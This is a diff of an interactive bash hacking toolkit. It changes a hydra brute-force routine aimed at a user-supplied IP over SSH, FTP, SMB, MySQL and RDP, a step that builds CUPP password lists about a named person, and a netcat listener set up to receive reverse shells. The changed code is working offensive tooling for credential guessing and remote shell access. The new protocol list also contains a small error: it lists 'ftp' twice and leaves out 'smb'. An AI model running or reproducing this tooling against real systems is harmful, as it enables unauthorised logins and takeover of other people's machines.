@@ -2055,10 +2055,10 @@ brute_force_attack() {
     read -e -p "Enter the target IP: " target_ip
 
     echo -e "${BLUE}[+] Select the protocol to brute force:${NC}"
-    protocols=("SSH" "FTP" "SMB" "MySQL" "RDP")
+    protocols=("ssh" "ftp" "ftp" "mysql" "rdp")
     select protocol in "${protocols[@]}"; do
         case $protocol in
-            SSH|FTP|SMB|MySQL|RDP)
+            ssh|ftp|smb|mysql|rdp)
                 echo -e "${GREEN}Selected protocol: $protocol${NC}"
                 break
                 ;;
@@ -2116,15 +2116,15 @@ brute_force_attack() {
 
     if [ "$user_choice" == "u" ]; then
         if [ "$pass_choice" == "p" ]; then
-            hydra -l "$username" -p "$password" -t "$threads" -o "$result_file" "$target_ip" "$protocol"
+            hydra -l "$username" -p "$password" -t "$threads" -o "$result_file" "$protocol://$target_ip" 
         else
-            hydra -l "$username" -P "$pass_dict" -t "$threads" -o "$result_file" "$target_ip" "$protocol"
+            hydra -l "$username" -P "$pass_dict" -t "$threads" -o "$result_file" "$protocol://$target_ip"
         fi
     else
         if [ "$pass_choice" == "p" ]; then
-            hydra -L "$user_dict" -p "$password" -t "$threads" -o "$result_file" "$target_ip" "$protocol"
+            hydra -L "$user_dict" -p "$password" -t "$threads" -o "$result_file" "$protocol://$target_ip"
         else
-            hydra -L "$user_dict" -P "$pass_dict" -t "$threads" -o "$result_file" "$target_ip" "$protocol"
+            hydra -L "$user_dict" -P "$pass_dict" -t "$threads" -o "$result_file" "$protocol://$target_ip"
         fi
     fi
 
@@ -2158,6 +2158,7 @@ generate_passwords_cupp() {
 
     # Return to the original directory
     cd ..
+    echo -e "${GREEN}[+] CUPP dictionary will be saved at /cupp/name_of_the_person.txt directory...${NC}"
 }
 
 # Function to clean up and close the Netcat listener
@@ -2180,7 +2181,7 @@ post_exploitation() {
     # Create a new tmux session for the Netcat listener
     tmux new-session -d -s nc_listener "nc -lvnp $listen_port > /tmp/nc_output.txt"
 
-    echo -e "${BLUE}You can now run the reverse shell... ${NC}"
+    echo -e "${RED}You can now run the reverse shell... ${NC}"
     echo
     echo -e "${YELLOW}[+] Select a post-exploitation option: ${NC}"
     read -e -p "Is the shell Linux or Windows? (l/w): " shell_type
